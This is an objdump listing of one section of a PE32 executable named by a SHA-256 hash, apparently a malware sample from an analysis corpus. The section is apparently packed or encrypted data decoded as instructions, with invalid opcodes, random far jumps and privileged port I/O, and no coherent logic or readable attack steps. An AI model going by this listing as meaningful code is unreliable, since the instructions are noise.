
5a7f019ebc03ab96a85dd43c3b73d5e57bdcbea91f3a5530115d5d1c17faa4cb.exe:     file format pei-i386


Disassembly of section ¬7Ý‡H™€_:

00476000 <¬7Ý‡H™€_>:
	...
  476014:	add    BYTE PTR [esi-0x49],ch
  476017:	mov    bh,0xff
  476019:	inc    eax
  47601a:	adc    BYTE PTR [eax+0x0],al
  47601d:	cmp    BYTE PTR [eax+eax*1+0x20400],dh
  476024:	jns    0x476049
  476026:	or     eax,DWORD PTR [ecx]
  476028:	add    al,BYTE PTR [edi]
  47602a:	and    DWORD PTR [ebx],ebx
  47602c:	in     eax,0x72
  47602e:	mov    ecx,0x6d01165c
  476033:	and    BYTE PTR [ebx+eax*1],cl
  476036:	loope  0x476068
  476038:	(bad)  
  476039:	jmp    FWORD PTR [edi-0x45]
  47603c:	in     al,dx
  47603d:	pop    ds
  47603e:	jae    0x476055
  476040:	add    al,0xa
  476042:	(bad)  
  476043:	mov    ds:0x6d4a53e4,al
  476048:	loopne 0x476026
  47604a:	ja     0x47609b
  47604c:	mov    ds:0x54092d49,eax
  476051:	xchg   ebx,eax
  476052:	adc    DWORD PTR [ebx],edx
  476054:	ja     0x4760cf
  476056:	mov    ebx,0x931216fc
  47605b:	in     al,0xc2
  47605d:	adc    dl,BYTE PTR [edx]
  47605f:	fisttp DWORD PTR [ecx]
  476061:	pop    ebx
  476062:	mov    esp,0xe005b91
  476067:	in     al,dx
  476068:	jbe    0x4760e9
  47606a:	jnp    0x476098
  47606c:	ret    0xe69a
  47606f:	pxor   mm2,mm1
  476072:	and    esi,ebp
  476074:	adc    dh,BYTE PTR [ebx+0xc]
  476077:	cdq    
  476078:	out    0x26,al
  47607a:	adc    dl,BYTE PTR [ebx]
  47607c:	fldlg2 
  47607e:	mov    ds,ebp
  476080:	fld    QWORD PTR [esi+eax*1+0x2ee6d911]
  476087:	cwde   
  476088:	popa   
  476089:	ret    
  47608a:	mov    cl,0xfd
  47608c:	fcmovnu st,st(7)
  47608e:	jge    0x4760b1
  476090:	mov    eax,0x612ab0c1
  476095:	ffree  st(4)
  476097:	mov    eax,ds:0xf02d48b
  47609c:	imul   esp,DWORD PTR [ecx+ebp*8-0xd3bfda4],0x65
  4760a4:	sub    ebx,edi
  4760a6:	mov    ebx,0x37f5822d
  4760ab:	dec    edi
  4760ac:	lahf   
  4760ad:	push   ss
  4760ae:	adc    al,0xf2
  4760b0:	je     0x4760a1
  4760b2:	cdq    
  4760b3:	icebp  
  4760b4:	adc    DWORD PTR [ebx],ebx
  4760b6:	push   ss
  4760b7:	sbb    al,BYTE PTR [ebp-0x37a30d0e]
  4760bd:	loope  0x476097
  4760bf:	lock rol esp,1
  4760c2:	mov    ds:0x4b79a797,al
  4760c7:	sbb    ecx,ecx
  4760c9:	mov    ebx,0xc1b2d316
  4760ce:	les    ebx,FWORD PTR [esi+esi*8]
  4760d1:	pop    ss
  4760d2:	sti    
  4760d3:	add    esi,DWORD PTR [ebx+0x2]
  4760d6:	jae    0x476079
  4760d8:	sbb    dl,BYTE PTR [edx+0x3e16cc1b]
  4760de:	adc    ebx,DWORD PTR [ebp-0x3e280014]
  4760e4:	or     bh,BYTE PTR [ecx+0x16]
  4760e7:	sub    al,0x50
  4760e9:	push   esi
  4760ea:	aam    0x13
  4760ec:	xchg   ebx,eax
  4760ed:	and    bh,BYTE PTR [ebx-0x44e828e5]
  4760f3:	test   DWORD PTR [edx-0x2a],0xa0f260a
  4760fa:	fisttp DWORD PTR [edi]
  4760fc:	xchg   esp,eax
  4760fd:	mov    esp,0x2bec8e56
  476102:	mov    ebp,0x33bd4bd7
  476107:	or     ebp,DWORD PTR [ebx+ebx*8+0x1d]
  47610b:	fcom   QWORD PTR [ebx]
  47610d:	mov    ebp,DWORD PTR [ecx-0x6a]
  476110:	adc    ah,BYTE PTR [ebx]
  476112:	fadd   DWORD PTR [eax+0x54476335]
  476118:	fisub  WORD PTR [ebx+0x73]
  47611b:	inc    DWORD PTR gs:[esi]
  47611e:	fisttp DWORD PTR [ebp+0x52]
  476121:	xor    DWORD PTR [ebx-0x4f],esi
  476124:	push   ds
  476125:	pop    esp
  476126:	or     al,0xd5
  476128:	xchg   ebx,eax
  476129:	pop    esi
  47612a:	and    edx,DWORD PTR [ecx+0x1b3cfc93]
  476130:	adc    edx,DWORD PTR [ebx+0x67dde095]
  476136:	xor    bh,dh
  476138:	arpl   WORD PTR [esi],bx
  47613a:	(bad)  
  47613c:	jae    0x4760cf
  47613e:	fiadd  WORD PTR [eax]
  476140:	cmp    BYTE PTR [ecx],dl
  476142:	int3   
  476143:	idiv   DWORD PTR [esi]
  476145:	or     eax,0xbb49909f
  47614a:	or     al,0xe
  47614c:	push   edi
  47614d:	xchg   edi,eax
  47614e:	ins    BYTE PTR es:[edi],dx
  47614f:	mov    bl,0xd9
  476151:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  476152:	adc    eax,0x91c4a840
  476157:	and    edi,DWORD PTR [esi+ecx*1+0x1b]
  47615b:	jnp    0x476113
  47615d:	or     DWORD PTR [eax+edx*8-0x42557309],0xde1fee7b
  476168:	daa    
  476169:	or     BYTE PTR [ecx+0x79],bl
  47616c:	ret    
  47616d:	aam    0xd0
  47616f:	sub    al,0xc0
  476171:	sbb    DWORD PTR [ecx],ecx
  476173:	sbb    al,0xbb
  476175:	lods   eax,DWORD PTR ds:[esi]
  476176:	fistp  DWORD PTR [ebp+0x44100c2d]
  47617c:	(bad)  
  47617e:	mov    BYTE PTR [ecx+0x1785c826],bl
  476184:	in     al,dx
  476185:	inc    ecx
  476186:	jae    0x476179
  476188:	adc    eax,0x68eebbf
  47618d:	mov    edi,0x691f77dd
  476192:	inc    ecx
  476193:	aam    0x43
  476195:	leave  
  476196:	lea    esp,[ecx]
  476198:	cdq    
  476199:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  47619a:	or     BYTE PTR [eax],0x94
  47619d:	or     al,0xdd
  47619f:	and    DWORD PTR [esi-0x36352321],esi
  4761a5:	lods   eax,DWORD PTR ds:[esi]
  4761a6:	sbb    al,BYTE PTR [edx-0x27]
  4761a9:	vmwrite esp,ecx
  4761ac:	dec    ebp
  4761ae:	jg     0x4761b7
  4761b0:	in     eax,0x1
  4761b2:	loope  0x47614f
  4761b4:	int    0x39
  4761b6:	rcl    BYTE PTR [esi+ebp*8-0x230cc],1
  4761bd:	test   dh,ch
  4761bf:	pop    ebx
  4761c0:	jmp    0x672864a2
  4761c5:	imul   esp,ecx,0xefd1ede9
  4761cb:	adc    eax,0xb0c7e53a
  4761d0:	out    dx,al
  4761d1:	imul   edi,DWORD PTR [ebx+eax*1-0x6d],0x4e
  4761d6:	push   ss
  4761d7:	das    
  4761d8:	mov    cl,0x2c
  4761da:	mov    esp,0x1e99d86d
  4761df:	adc    al,al
  4761e1:	or     ecx,DWORD PTR [edi+0x1c]
  4761e4:	ja     0x4761be
  4761e6:	idiv   esp
  4761e8:	adc    dl,BYTE PTR [ebx-0x11c23fe1]
  4761ee:	sbb    DWORD PTR [eax],edx
  4761f0:	pusha  
  4761f1:	jl     0x4761d2
  4761f3:	out    0x30,al
  4761f5:	and    eax,0x1e42e192
  4761fa:	fist   WORD PTR [ecx+esi*2+0x6f849871]
  476201:	leave  
  476202:	xchg   edx,eax
  476203:	jae    0x4761c6
  476205:	jae    0x4761bb
  476207:	jb     0x476264
  476209:	(bad)  
  47620b:	ins    DWORD PTR es:[edi],dx
  47620c:	shl    DWORD PTR [ebx+0x5b],cl
  47620f:	mov    es,WORD PTR [ebp+0x2c20c6]
  476215:	xchg   ebx,eax
  476216:	push   esp
  476217:	pop    esp
  476218:	aas    
  476219:	pop    ds
  47621a:	cmp    bh,dh
  47621c:	lock lahf 
  47621e:	xor    al,0xc1
  476220:	pop    ebx
  476221:	fisub  DWORD PTR [ecx-0xe5667f1]
  476227:	icebp  
  476228:	or     al,0x8
  47622a:	outs   dx,DWORD PTR ds:[esi]
  47622b:	mov    edx,0x5b9d2b12
  476230:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  476231:	xor    dl,BYTE PTR [edx]
  476233:	or     dl,dh
  476235:	adc    DWORD PTR [eax+edi*1],esp
  476238:	xchg   BYTE PTR [eax+0xb],ah
  47623b:	pop    esp
  47623c:	(bad)  
  47623d:	and    edi,DWORD PTR [eax+ecx*1]
  476240:	xchg   edx,eax
  476241:	and    ebx,edi
  476243:	cdq    
  476244:	sub    BYTE PTR [edx],dl
  476246:	inc    edi
  476247:	test   DWORD PTR [edi+0x4a],esi
  47624a:	repnz ins BYTE PTR es:[edi],dx
  47624c:	outs   dx,BYTE PTR ds:[esi]
  47624d:	mov    WORD PTR [ebp+0x4b650f86],cs
  476253:	call   0x8416:0x298976a4
  47625a:	push   ebx
  47625b:	mov    al,0xd9
  47625d:	jae    0x476282
  47625f:	sbb    eax,0x12ce6a29
  476264:	imul   BYTE PTR [esi]
  476266:	(bad)  
  476267:	sbb    DWORD PTR [edi+0xf],edx
  47626a:	xchg   esi,eax
  47626b:	gs xchg ebx,eax
  47626d:	out    dx,al
  47626e:	inc    ebx
  47626f:	pop    ebx
  476270:	dec    ebp
  476271:	mov    cl,0x85
  476273:	pop    edx
  476274:	sub    eax,0x5f61c3f6
  476279:	daa    
  47627a:	xor    DWORD PTR [edx],edx
  47627c:	ins    BYTE PTR es:[edi],dx
  47627d:	shl    BYTE PTR [eax+0x40],1
  476280:	sbb    ebx,DWORD PTR [ecx+edi*1-0x3c91373e]
  476287:	adc    dl,cl
  476289:	xor    al,0x62
  47628b:	inc    esi
  47628c:	adc    BYTE PTR [ebx],ah
  47628e:	rcr    BYTE PTR ds:0xbc3d232b,cl
  476294:	or     DWORD PTR [ebx-0x2f],ecx
  476297:	call   0x6499:0x29191c9d
  47629e:	xchg   edi,eax
  47629f:	xchg   edi,eax
  4762a0:	pop    ds
  4762a1:	mov    ebp,0x431c09cc
  4762a6:	sub    al,al
  4762a8:	pop    edi
  4762a9:	clc    
  4762aa:	jmp    DWORD PTR [edi*4+0x12c10210]
  4762b1:	mov    ebp,0xe91b69ce
  4762b6:	popf   
  4762b7:	sbb    al,0xee
  4762b9:	loopne 0x476331
  4762bb:	dec    ecx
  4762bc:	lds    ebx,FWORD PTR [ebx+esi*4]
  4762bf:	mov    al,0xfd
  4762c1:	pop    esi
  4762c2:	or     eax,DWORD PTR [edx-0x3be60eee]
  4762c8:	push   ecx
  4762c9:	add    dl,BYTE PTR [ecx-0x6e62de1]
  4762cf:	fild   DWORD PTR ds:0x1a67c45b
  4762d5:	xchg   edx,eax
  4762d6:	fisubr WORD PTR [esp+eax*8]
  4762d9:	shl    BYTE PTR [ebx+0x13],cl
  4762dc:	mov    ch,0xdf
  4762de:	into   
  4762df:	ins    DWORD PTR es:[edi],dx
  4762e0:	sbb    al,0x5c
  4762e2:	xchg   edx,eax
  4762e3:	mov    esp,0x9246694b
  4762e8:	imul   esi,ecx,0x3c
  4762eb:	arpl   WORD PTR [eax-0x6eec7321],si
  4762f1:	imul   ebp,ebp,0xd2fd8d6e
  4762f7:	push   ebp
  4762f8:	mov    esi,0x6b0ed745
  4762fd:	ja     0x476311
  4762ff:	add    ah,dl
  476301:	fild   DWORD PTR [ebx+0x52]
  476304:	lods   eax,DWORD PTR ds:[esi]
  476305:	fs adc ebp,ebx
  476308:	jae    0x476371
  47630a:	mov    cl,0x6b
  47630c:	adc    eax,0x40a3412
  476311:	push   ebx
  476312:	enter  0x6cab,0x18
  476316:	jl     0x47634d
  476318:	sahf   
  476319:	out    0xc3,al
  47631b:	mov    al,0x95
  47631d:	pop    esp
  47631e:	xlat   BYTE PTR ds:[ebx]
  47631f:	sbb    al,BYTE PTR [esi]
  476321:	idiv   ebp
  476323:	scas   eax,DWORD PTR es:[edi]
  476324:	sti    
  476325:	imul   ebx,DWORD PTR [ebp+0xe],0x1138a58b
  47632c:	dec    edi
  47632d:	loopne 0x476395
  47632f:	test   esp,eax
  476331:	jl     0x476331
  476333:	xchg   ebp,eax
  476334:	xor    al,0x6e
  476336:	ret    
  476337:	or     dh,BYTE PTR [esp+ecx*1]
  47633a:	retf   0xad09
  47633d:	sub    DWORD PTR [ebx-0x3646403e],0xc2125036
  476347:	push   ecx
  476348:	outs   dx,BYTE PTR ds:[esi]
  476349:	ss (bad) 
  47634b:	in     eax,dx
  47634c:	xchg   ebx,eax
  47634d:	sbb    bl,BYTE PTR [edx-0x2e]
  476350:	sbb    eax,0x21d43378
  476355:	sub    cl,al
  476357:	pop    edi
  476358:	or     eax,0x20c8bf07
  47635d:	or     DWORD PTR [edi+ebx*4],0x1a
  476361:	cmp    ch,BYTE PTR [esi]
  476363:	sbb    esp,ebx
  476365:	xor    edi,edi
  476367:	xchg   ebx,eax
  476368:	cmp    BYTE PTR [eax-0x79],0x51
  47636c:	adc    bh,bl
  47636e:	jo     0x4763c8
  476370:	test   DWORD PTR ds:0xedec7312,0xaebeee2b
  47637a:	imul   ecx,esi,0xfc2ffff0
  476380:	adc    esi,DWORD PTR [ebp+0x69]
  476383:	inc    ebp
  476384:	shr    BYTE PTR [ecx+0x77],cl
  476387:	imul   eax,DWORD PTR [ecx+edx*2-0x52],0xb1796294
  47638f:	mov    ch,0x67
  476391:	jge    0x4763c7
  476393:	sar    ah,cl
  476395:	aas    
  476396:	or     edi,esp
  476398:	mov    edi,0x966970bb
  47639d:	push   ds
  47639e:	jge    0x47638c
  4763a0:	mov    edi,0x81d43626
  4763a5:	imul   ebp,DWORD PTR [ebp+0x6b],0x6b987e1b
  4763ac:	pop    edx
  4763ad:	xchg   BYTE PTR [esi-0x8],dl
  4763b0:	mov    cl,0x7e
  4763b2:	imul   ebp,DWORD PTR [ebp+0x6e12c8e9],0xeed87ffa
  4763bc:	leave  
  4763bd:	inc    edx
  4763be:	jmp    0x178c553e
  4763c3:	mov    eax,DWORD PTR [esi+0x10]
  4763c6:	mov    bl,0x69
  4763c8:	mov    cl,0xe9
  4763ca:	push   cs
  4763cb:	(bad)  
  4763cc:	loopne 0x4763ab
  4763ce:	mov    ebp,0xfcb249f1
  4763d3:	mov    bl,0x2f
  4763d5:	mov    bh,0x4a
  4763d7:	mov    bl,0xaf
  4763d9:	add    al,0xe4
  4763db:	xchg   edx,eax
  4763dc:	ror    DWORD PTR [ebx+0x7b],0xf1
  4763e0:	or     eax,DWORD PTR [esi]
  4763e2:	sbb    ebp,DWORD PTR [edx*8+0x12ee0951]
  4763e9:	add    DWORD PTR [edi-0x1e10b0e8],esp
  4763ef:	add    esp,edi
  4763f1:	fstp   DWORD PTR [eax]
  4763f3:	in     eax,0xd5
  4763f5:	sahf   
  4763f6:	ins    DWORD PTR es:[edi],dx
  4763f7:	stc    
  4763f8:	mov    ecx,esp
  4763fa:	push   ss
  4763fb:	aam    0xa0
  4763fd:	fimul  WORD PTR ds:0xb631e553
  476403:	xchg   ebx,eax
  476404:	lea    edx,[ebx+0x7de02c12]
  47640a:	xchg   edi,eax
  47640b:	ret    0xd118
  47640e:	fild   DWORD PTR [esi-0x46]
  476411:	inc    ecx
  476412:	shr    DWORD PTR [edx],1
  476414:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  476415:	xchg   ecx,eax
  476416:	je     0x476398
  476418:	add    al,0xf7
  47641a:	pop    ds
  47641b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  47641c:	jnp    0x47643f
  47641e:	retf   0x70dd
  476421:	xchg   ecx,eax
  476422:	xchg   ecx,eax
  476423:	jmp    0x731b9088
  476428:	sub    al,0xe4
  47642a:	pop    ebp
  47642b:	mov    esp,0x9157eb37
  476430:	adc    ah,ah
  476432:	ror    DWORD PTR [edi],1
  476434:	dec    ebx
  476435:	pop    es
  476436:	aad    0x8d
  476438:	popf   
  476439:	je     0x476491
  47643b:	rcr    DWORD PTR [ebp+ecx*2+0x2c],1
  47643f:	mov    BYTE PTR [ebx-0x3a],dh
  476442:	imul   dh
  476444:	mov    ecx,0x1e4c8bf1
  476449:	and    BYTE PTR [ebx-0x23],ah
  47644c:	icebp  
  47644d:	jmp    0xf6aed54
  476452:	or     eax,0xa868b5b7
  476457:	adc    DWORD PTR ds:0x5613e492,edx
  47645d:	mul    BYTE PTR [ebx+0x33]
  476460:	adc    al,0x5c
  476462:	mov    al,ds:0x23355cc4
  476467:	fstp   QWORD PTR [ebx+0x584f9bcd]
  47646d:	xor    DWORD PTR [edx+0x1c],edx
  476470:	ins    DWORD PTR es:[edi],dx
  476471:	and    ebx,edi
  476473:	bound  ecx,QWORD PTR [esi*1-0x26a2e4af]
  47647a:	push   es
  47647b:	xor    ebx,DWORD PTR [ebx+0xf133e3b]
  476481:	rol    bl,cl
  476483:	adc    al,0x6f
  476485:	pop    eax
  476486:	js     0x4764be
  476488:	push   0x5f
  47648a:	pop    esp
  47648b:	adc    BYTE PTR [ecx+0x7e],0xbd
  47648f:	rol    DWORD PTR [ecx],1
  476491:	adc    al,al
  476493:	call   FWORD PTR [ebx-0x2ea4eb71]
  476499:	add    al,0x21
  47649b:	add    eax,esp
  47649d:	lods   eax,DWORD PTR ds:[esi]
  47649e:	neg    ch
  4764a0:	imul   esp,DWORD PTR [esi-0x17],0xb0db21eb
  4764a7:	sbb    edi,DWORD PTR [edi+0x5659063f]
  4764ad:	add    DWORD PTR [ebx+eax*4],ebp
  4764b0:	or     al,0x4
  4764b2:	cmp    ebp,edi
  4764b4:	adc    ebx,ebx
  4764b6:	add    eax,0x3cb00fdc
  4764bb:	loopne 0x4764c4
  4764bd:	cmp    ebp,DWORD PTR [esi+0x5118d1c4]
  4764c3:	sub    esi,eax
  4764c5:	in     eax,dx
  4764c6:	sbb    ebp,DWORD PTR [edx]
  4764c8:	jl     0x4764dd
  4764ca:	(bad)  
  4764cb:	icebp  
  4764cc:	adc    DWORD PTR [edi],ebx
  4764ce:	lock shl DWORD PTR [edx+0xb],1
  4764d2:	sub    eax,0x669c6e3a
  4764d7:	fcom   QWORD PTR [ecx-0x61]
  4764da:	cld    
  4764db:	cmc    
  4764dc:	jmp    0x4764f4
  4764de:	adc    eax,0xf87df4f8
  4764e3:	cmc    
  4764e4:	(bad)  
  4764e5:	int3   
  4764e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4764e7:	aam    0x34
  4764e9:	in     eax,dx
  4764ea:	push   cs
  4764eb:	cld    
  4764ec:	mov    ebp,0xfe819e3
  4764f1:	imul   edx,ecx,0x9bef1a49
  4764f7:	cld    
  4764f8:	outs   dx,BYTE PTR ds:[esi]
  4764f9:	neg    al
  4764fb:	test   DWORD PTR [di],0xdbd113f3
  476502:	out    0x2c,al
  476504:	inc    ebp
  476505:	out    dx,eax
  476506:	pop    ebx
  476507:	inc    ebp
  476508:	mov    ecx,0xf1335ee7
  47650d:	sbb    ebx,DWORD PTR [edi]
  47650f:	daa    
  476510:	adc    DWORD PTR [eax],esp
  476512:	or     eax,0x4d9d8813
  476517:	push   edi
  476518:	push   ss
  476519:	and    dh,BYTE PTR [ebx]
  47651b:	fiadd  WORD PTR [edi+0xc5b91c2]
  476521:	adc    DWORD PTR [edi],edx
  476523:	mov    eax,ds:0x848abc8e
  476528:	mov    bh,0x87
  47652a:	popa   
  47652b:	das    
  47652c:	fwait
  47652d:	mov    ds,WORD PTR [esi-0x5f629697]
  476533:	xchg   ebp,eax
  476534:	add    eax,0xee0fbfb6
  476539:	scas   al,BYTE PTR es:[edi]
  47653a:	mov    esi,0x9512c9e9
  47653f:	jns    0x476540
  476541:	jg     0x476519
  476543:	xor    eax,0x12055cbd
  476548:	loope  0x4764d7
  47654a:	imul   edx,DWORD PTR [ebp+0x1f],0x50
  47654e:	push   es
  47654f:	hlt    
  476550:	xchg   ecx,eax
  476551:	push   eax
  476552:	jle    0x4764f8
  476554:	rcl    DWORD PTR [edi-0xd],1
  476557:	dec    ebp
  476558:	ja     0x4764fb
  47655a:	push   es
  47655b:	imul   edx,DWORD PTR [eax+0x4],0x6ba5740b
  476562:	mov    bh,0x50
  476564:	adc    esi,esp
  476566:	mov    bh,0xdf
  476568:	dec    edx
  476569:	add    BYTE PTR [eax],0x6b
  47656c:	jb     0x4765be
  47656e:	daa    
  47656f:	les    eax,FWORD PTR [edi]
  476571:	adc    ebp,DWORD PTR [ebx-0xe]
  476574:	push   eax
  476575:	addr16 in eax,dx
  476577:	ins    DWORD PTR es:[edi],dx
  476578:	arpl   cx,di
  47657a:	loop   0x4765e7
  47657c:	jno    0x4765ce
  47657e:	inc    eax
  47657f:	lock stos BYTE PTR es:[edi],al
  476581:	icebp  
  476582:	add    DWORD PTR [edi+0x6],edi
  476585:	sub    al,0x50
  476587:	fst    st(2)
  476589:	push   DWORD PTR [edi-0x3a9ffd97]
  47658f:	push   ecx
  476590:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  476591:	aaa    
  476592:	jmp    0x303c3723
  476597:	imul   eax,esi,0x12dd88da
  47659d:	(bad)  
  47659e:	lods   eax,DWORD PTR ds:[esi]
  47659f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4765a0:	jmp    DWORD PTR [edi-0x74]
  4765a3:	imul   ebp,DWORD PTR [edi+ebx*1+0x71b1eb0e],0xe89ace1
  4765ae:	(bad)  [ebx-0x8]
  4765b1:	aaa    
  4765b2:	sahf   
  4765b3:	std    
  4765b4:	pop    ebp
  4765b5:	outs   dx,DWORD PTR ds:[esi]
  4765b6:	and    eax,0xf42dfc69
  4765bb:	stc    
  4765bc:	out    0x67,al
  4765be:	lds    edx,FWORD PTR [ecx-0x7191d9ca]
  4765c4:	enter  0x20e5,0x74
  4765c8:	js     0x4765a8
  4765ca:	mov    al,BYTE PTR [esi]
  4765cc:	jg     0x476629
  4765ce:	and    eax,0xa2d980b
  4765d3:	clc    
  4765d4:	mov    dl,0x8f
  4765d6:	enter  0xd9cf,0x8b
  4765da:	mov    bh,0xf
  4765dc:	xlat   BYTE PTR ds:[ebx]
  4765dd:	push   0xb383165b
  4765e2:	neg    DWORD PTR [eax]
  4765e4:	adc    eax,0x9e73480e
  4765e9:	fadd   st(0),st
  4765eb:	add    al,0x26
  4765ed:	in     eax,dx
  4765ee:	add    BYTE PTR [ebp+0x54],dh
  4765f1:	ins    BYTE PTR es:[edi],dx
  4765f2:	push   ss
  4765f3:	xor    al,0x7b
  4765f5:	jnp    0x476584
  4765f7:	add    esp,0xa16b9100
  4765fd:	or     BYTE PTR [ebx],bl
  4765ff:	mov    ds:0x4f5d3211,eax
  476604:	outs   dx,BYTE PTR ds:[esi]
  476605:	pop    edx
  476606:	pop    ecx
  476607:	xor    esp,DWORD PTR [edx+eiz*8+0x67]
  47660b:	mov    ah,0xef
  47660d:	push   ss
  47660e:	leave  
  47660f:	ror    DWORD PTR [ebx-0x7e1b7314],0x5
  476616:	into   
  476617:	sub    bh,cl
  476619:	ret    
  47661a:	add    cl,dh
  47661c:	jl     0x4765f1
  47661e:	fstp   TBYTE PTR [ebx]
  476620:	sub    esi,0xdac26d8c
  476626:	shr    BYTE PTR [ecx],0x34
  476629:	call   0x3d5:0x3c9d8736
  476630:	adc    al,0x5a
  476632:	mov    edi,eax
  476634:	xchg   ecx,eax
  476635:	int    0xc1
  476637:	out    0x40,al
  476639:	adc    BYTE PTR [edx+0x43d51687],bl
  47663f:	loopne 0x4765c6
  476641:	cdq    
  476642:	sbb    dl,BYTE PTR [ecx]
  476644:	cdq    
  476645:	int3   
  476646:	xor    al,BYTE PTR [esi+0x5a7a764c]
  47664c:	jmp    0x47665d
  47664e:	jl     0x4765e0
  476650:	and    eax,0xffbb7ba
  476655:	mov    cl,al
  476657:	xchg   DWORD PTR [edi],ecx
  476659:	xor    BYTE PTR [esi-0x2167b650],dl
  47665f:	cwde   
  476660:	in     eax,0x37
  476662:	dec    esp
  476663:	mov    ebp,0x19e271d0
  476668:	xchg   edx,eax
  476669:	sbb    eax,0x8ef678e1
  47666e:	in     eax,dx
  47666f:	adc    eax,DWORD PTR [esi]
  476671:	test   BYTE PTR [esi+0x15978b15],0x6b
  476678:	nop
  476679:	fcomp  st(2)
  47667b:	pop    ebx
  47667c:	out    dx,al
  47667d:	cmp    eax,0x95ccaa15
  476682:	daa    
  476683:	cld    
  476684:	cs xchg ebp,eax
  476686:	fcomip st,st(4)
  476688:	cmp    al,0x5c
  47668a:	jbe    0x4766e7
  47668c:	ficom  WORD PTR [edx+edx*1]
  47668f:	pop    ss
  476690:	jl     0x47669d
  476692:	and    eax,DWORD PTR [ebx+0x5b071b8b]
  476698:	sub    ebx,DWORD PTR ds:0x8723b643
  47669e:	pop    es
  47669f:	(bad)  
  4766a1:	adc    ah,dh
  4766a3:	les    ebx,FWORD PTR [ebx-0x5b]
  4766a6:	xchg   ecx,eax
  4766a7:	sub    BYTE PTR [esi+edi*2+0x5393aeb8],bl
  4766ae:	aad    0x4a
  4766b0:	dec    edi
  4766b1:	mov    WORD PTR [eax],es
  4766b3:	pop    ebx
  4766b4:	push   ebx
  4766b5:	lods   eax,DWORD PTR ds:[esi]
  4766b6:	pop    edx
  4766b7:	aas    
  4766b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4766b9:	outs   dx,DWORD PTR ds:[esi]
  4766ba:	aas    
  4766bb:	mov    dh,0xdd
  4766bd:	adc    edx,DWORD PTR [ebx]
  4766bf:	fisubr WORD PTR [esi+0x271c195b]
  4766c5:	jns    0x476668
  4766c7:	call   FWORD PTR ds:0x4190641f
  4766cd:	mov    edx,0x3d4d07a5
  4766d2:	sub    eax,0x19064190
  4766d7:	out    0x17,al
  4766d9:	pop    es
  4766da:	jge    0x4766e2
  4766dc:	sbb    DWORD PTR [esi+esi*8-0x5a],esp
  4766e0:	(bad)  
  4766e1:	imul   esp,DWORD PTR [ecx-0x57a45da7],0xac61466
  4766eb:	leave  
  4766ec:	xchg   edx,eax
  4766ed:	pusha  
  4766ee:	sbb    al,0x76
  4766f0:	dec    eax
  4766f1:	jae    0x4766b9
  4766f3:	clc    
  4766f4:	xchg   ecx,eax
  4766f5:	frstor [edx-0x662509ae]
  4766fb:	fucomi st,st(7)
  4766fd:	xchg   BYTE PTR [ebx],bl
  4766ff:	and    DWORD PTR [esi+0x6ea70c06],ebp
  476705:	sub    al,0xfe
  476707:	jnp    0x4766ea
  476709:	inc    eax
  47670a:	adc    dl,BYTE PTR [ebx+ebx*2]
  47670d:	cmp    BYTE PTR [ebx],al
  47670f:	adc    cl,dh
  476711:	inc    esi
  476712:	sub    esi,DWORD PTR [esi]
  476714:	mov    eax,ds:0x6904eef4
  476719:	and    dl,BYTE PTR [edi-0x37]
  47671c:	jbe    0x4766f2
  47671e:	xchg   ebp,eax
  47671f:	dec    edi
  476720:	clc    
  476721:	sub    al,BYTE PTR [esi]
  476723:	nop
  476724:	das    
  476725:	jbe    0x476793
  476727:	pop    ss
  476728:	adc    ecx,DWORD PTR [esp+edi*2+0x4b1ae84b]
  47672f:	cmp    ecx,DWORD PTR [edi]
  476731:	ins    BYTE PTR es:[edi],dx
  476732:	or     cl,BYTE PTR [ebx-0x37]
  476735:	out    dx,al
  476736:	mov    al,0x2
  476738:	push   eax
  476739:	es cmp al,0x44
  47673c:	ins    BYTE PTR es:[edi],dx
  47673d:	adc    edi,DWORD PTR [edx+esi*4+0x4c1c6401]
  476744:	js     0x47678a
  476746:	cmp    al,0x5e
  476748:	push   es
  476749:	in     al,0x95
  47674b:	dec    eax
  47674c:	cmp    al,0xd1
  47674e:	ror    DWORD PTR [ebp+esi*8+0x49de970d],1
  476755:	ror    DWORD PTR [eax],1
  476757:	or     eax,0x1db41206
  47675c:	sar    DWORD PTR [esi+esi*1+0x27],1
  476760:	nop
  476761:	mov    WORD PTR [esp+edi*4],?
  476764:	adc    cl,BYTE PTR [ecx+edx*8+0x4b7bf98c]
  47676b:	mov    ss,WORD PTR [edx]
  47676d:	mov    WORD PTR [edx],ss
  47676f:	into   
  476770:	(bad)  
  476771:	hlt    
  476772:	cmc    
  476773:	ficom  WORD PTR [eax+0x59772c27]
  476779:	jns    0x476784
  47677b:	in     al,dx
  47677c:	aad    0x19
  47677e:	rcr    BYTE PTR [ecx-0x61],0x58
  476782:	and    esi,ecx
  476784:	ficom  WORD PTR [edx+0x791959dd]
  47678a:	adc    cl,BYTE PTR [eax-0x2c]
  47678d:	mov    cl,0xc9
  47678f:	into   
  476790:	dec    esi
  476791:	and    eax,0x5417940d
  476796:	cmp    ah,BYTE PTR ds:0x54b02e7b
  47679c:	pop    esp
  47679d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  47679e:	fldenv [ecx]
  4767a0:	fldenv [ebx+eax*1]
  4767a3:	rcr    BYTE PTR [ecx+ebx*8+0x54],cl
  4767a7:	fisub  DWORD PTR [ebp+0x3605e691]
  4767ad:	fimul  DWORD PTR [eax+0x3c]
  4767b0:	int3   
  4767b1:	call   0x9ada:0x93901926
  4767b8:	ficomp DWORD PTR [edx+0x79]
  4767bb:	cs nop
  4767bd:	dec    ecx
  4767be:	pop    edx
  4767bf:	enter  0x921a,0x1
  4767c3:	cmp    DWORD PTR [ecx],ebx
  4767c5:	pop    edx
  4767c6:	sbb    bl,BYTE PTR [edx-0x19]
  4767c9:	add    bl,BYTE PTR [ecx+0x53dfdf64]
  4767cf:	sbb    DWORD PTR [eax-0x20606e6d],edx
  4767d5:	lahf   
  4767d6:	fisttp WORD PTR [ecx]
  4767d8:	in     al,0x21
  4767da:	daa    
  4767db:	sbb    ebx,DWORD PTR [ebx+ebx*1+0x3e47259c]
  4767e2:	lahf   
  4767e3:	out    0xdc,eax
  4767e5:	pushf  
  4767e6:	sbb    ebx,DWORD PTR [esp+ebx*8-0x7a368b64]
